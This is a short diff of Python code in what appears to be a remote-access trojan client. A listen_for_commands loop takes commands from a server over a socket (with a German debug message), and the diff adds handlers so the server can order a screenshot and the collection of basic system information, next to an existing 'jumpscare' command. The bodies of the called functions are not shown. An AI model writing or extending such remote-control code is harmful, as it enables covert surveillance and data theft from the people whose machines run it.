@@ -14,6 +14,10 @@ def listen_for_commands(client_socket):
                 print(f"Befehl vom Server empfangen: {data}")
                 if data == "JUMPSCARE":
                     init_jumpscare('Adsadsa')
+                if data == "SCREENSHOT":
+                    init_screenshot('Adsadsad')
+                if data == "GETBASICINFORMATION":
+                    init_basic_information('Asasad')
             else:
                 break
         except:
